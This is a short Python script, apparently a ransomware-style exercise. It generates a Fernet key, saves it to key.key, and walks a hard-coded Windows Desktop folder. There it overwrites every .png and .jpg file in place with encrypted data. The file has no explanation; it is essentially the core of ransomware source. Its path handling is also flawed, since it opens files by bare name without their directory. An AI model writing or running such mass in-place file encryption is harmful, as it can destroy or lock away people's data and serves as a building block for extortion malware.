from cryptography.fernet import Fernet
import os

key = Fernet.generate_key()

with open("key.key","wb") as f:
    f.write(key)

fernet = Fernet(key)
os.chdir("C:\\Users\\HP\\OneDrive - Alexandria University\\Desktop")

for i in os.walk(os.getcwd()):
    for j in i[2]:
        if str(j).endswith(".png") or str(j).endswith(".jpg"):
            with open(str(j),"rb") as f:
                data=f.read()
            encrypted = fernet.encrypt(data)
            with open(str(j),"wb") as f:
                f.write(encrypted)
